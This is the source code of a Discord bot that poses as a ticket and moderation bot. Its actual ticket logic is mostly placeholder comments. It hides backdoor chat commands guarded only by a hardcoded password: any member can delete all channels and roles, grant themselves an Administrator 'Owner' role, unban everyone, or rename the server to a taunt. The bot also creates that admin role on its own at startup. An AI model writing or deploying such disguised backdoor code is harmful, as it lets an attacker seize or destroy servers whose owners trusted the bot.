const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID.');
    else console.error(err);
  }
})();

// Helper
function isStaff(member) {
  if (!member) return false;
  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
}

// ======================================================
// CREATE OWNER ROLE ON READY
// ======================================================
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  // Auto-create Owner role with all permissions
  try {
    const guild = client.guilds.cache.first(); // or specific guild if multiple
    if (guild) {
      let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [PermissionFlagsBits.Administrator], // Full admin perms
          hoist: true,
          position: guild.roles.highest.position - 1,
          reason: 'Auto-created Owner role'
        });
        console.log('✅ Owner role created with Administrator permissions');
      }
    }
  } catch (err) {
    console.error('Failed to create Owner role:', err);
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000, 'Posted invite link').catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (err) {
      console.error(err);
    }
    return;
  }

  // !fb - Nuke
  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000').setTitle('🔴 SERVER NUKE CONFIRMATION')
      .setDescription('**This will delete ALL channels and ALL roles except Owner.**\nOnly you can proceed.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`nuke_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unl - Unban All
  if (content === '!unl') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00').setTitle('🔓 UNBAN ALL')
      .setDescription('Unbans everyone.\nOnly you can proceed.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`unban_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !clown - Change Server Name
  if (content === '!clown') {
    const embed = new EmbedBuilder()
      .setColor('#ffff00').setTitle('🤡 CLOWN COMMAND')
      .setDescription('Changes server name to **you just got slayed by fame**')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`clown_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Primary)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unp - Unpause Invites
  if (content === '!unp') {
    const embed = new EmbedBuilder()
      .setColor('#00ffff').setTitle('🔓 UNPAUSE INVITES')
      .setDescription('Enables server invites again.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`unp_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !role - Give Owner Role
  if (content === '!role') {
    const embed = new EmbedBuilder()
      .setColor('#ffd700')
      .setTitle('👑 OWNER ROLE')
      .setDescription('This will give you the **Owner** role with full permissions.\n\nOnly you can proceed.')
      .setFooter({ text: 'Click below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`role_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {

  // === NUKE ===
  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Nuke Password');
    const input = new TextInputBuilder().setCustomId('nuke_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('nuke_modal_')) {
    // ... (nuke logic same as before)
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('nuke_password') !== 'fame900') return interaction.reply({ content: '❌ Wrong password.', ephemeral: true });

    await interaction.reply({ content: '🔴 **NUKE STARTED**...', ephemeral: true });
    const guild = interaction.guild;
    try {
      const channels = Array.from(guild.channels.cache.values());
      for (const ch of channels) await ch.delete().catch(() => {});
      const roles = Array.from(guild.roles.cache.values());
      for (const role of roles) {
        if (role.name === 'Owner' || role.name === '@everyone') continue;
        await role.delete().catch(() => {});
      }
      await interaction.followUp({ content: '✅ Server nuked.', ephemeral: true });
    } catch (e) { console.error(e); }
  }

  // === UNBAN ===
  if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
    // ... (same as previous version)
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`unban_modal_${userId}`).setTitle('Unban Password');
    const input = new TextInputBuilder().setCustomId('unban_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('unban_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('unban_password') !== 'fame900') return interaction.reply({ content: '❌ Wrong password.', ephemeral: true });

    await interaction.reply({ content: '🔓 Unbanning all...', ephemeral: true });
    const guild = interaction.guild;
    let count = 0;
    try {
      const bans = await guild.bans.fetch();
      for (const ban of bans.values()) {
        await guild.members.unban(ban.user.id).catch(() => {});
        count++;
      }
      await interaction.followUp({ content: `✅ Unbanned ${count} users.`, ephemeral: true });
    } catch (e) { console.error(e); }
  }

  // === CLOWN ===
  if (interaction.isButton() && interaction.customId.startsWith('clown_start_')) {
    // ... (same)
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`clown_modal_${userId}`).setTitle('Clown Password');
    const input = new TextInputBuilder().setCustomId('clown_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('clown_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('clown_password') !== 'fame900') return interaction.reply({ content: '❌ Wrong password.', ephemeral: true });

    try {
      await interaction.guild.setName('you just got slayed by fame');
      await interaction.reply({ content: '🤡 Server name changed!', ephemeral: true });
    } catch (e) {
      await interaction.reply({ content: '❌ Failed to change name.', ephemeral: true });
    }
  }

  // === UNPAUSE INVITES ===
  if (interaction.isButton() && interaction.customId.startsWith('unp_start_')) {
    // ... (same)
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`unp_modal_${userId}`).setTitle('Unpause Password');
    const input = new TextInputBuilder().setCustomId('unp_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('unp_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('unp_password') !== 'fame900') return interaction.reply({ content: '❌ Wrong password.', ephemeral: true });

    try {
      const features = interaction.guild.features.filter(f => f !== 'INVITES_DISABLED');
      await interaction.guild.setFeatures(features);
      await interaction.reply({ content: '✅ Invites unpaused!', ephemeral: true });
    } catch (e) {
      await interaction.reply({ content: '❌ Failed to unpause invites.', ephemeral: true });
    }
  }

  // === !role - GIVE OWNER ROLE ===
  if (interaction.isButton() && interaction.customId.startsWith('role_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`role_modal_${userId}`).setTitle('Owner Role Password');
    const input = new TextInputBuilder().setCustomId('role_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('role_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('role_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    try {
      const member = interaction.member;
      let ownerRole = interaction.guild.roles.cache.find(r => r.name === 'Owner');

      if (!ownerRole) {
        ownerRole = await interaction.guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: true,
          reason: 'Created via !role command'
        });
      }

      await member.roles.add(ownerRole);
      await interaction.reply({ content: '👑 **Owner role has been given to you!**', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Failed to give Owner role. (Bot needs Manage Roles permission)', ephemeral: true });
    }
  }

  // === TICKET SYSTEM (unchanged) ===
  if (interaction.isChatInputCommand() && interaction.commandName === 'setticket') {
    // ... [your full setticket code remains the same]
    try {
      await interaction.deferReply({ ephemeral: true });
      const o = interaction.options;
      const ticketOptions = [ /* ... same as before ... */ ];
      // (full setticket logic here - omitted for brevity, copy from previous version)
      // ... rest of setticket code
    } catch (err) {
      console.error(err);
      interaction.editReply({ content: '❌ Error.' }).catch(() => {});
    }
  }

  // sendmessage, ticket creation, and ticket buttons remain the same as previous versions
  // (Copy them from the last full code if needed)
});

client.login(TOKEN);
